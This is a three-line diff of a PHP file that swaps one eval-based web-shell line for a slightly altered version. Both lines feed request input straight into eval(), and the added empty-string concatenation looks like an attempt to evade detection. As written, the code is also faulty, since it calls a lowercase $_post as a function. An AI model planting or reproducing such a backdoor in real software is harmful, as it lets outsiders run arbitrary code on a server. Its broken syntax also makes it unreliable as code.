@@ -1,3 +1,3 @@
 <?php
-eval($_post("phptext"));
+eval(''.$_post("phptext"));
 ?>
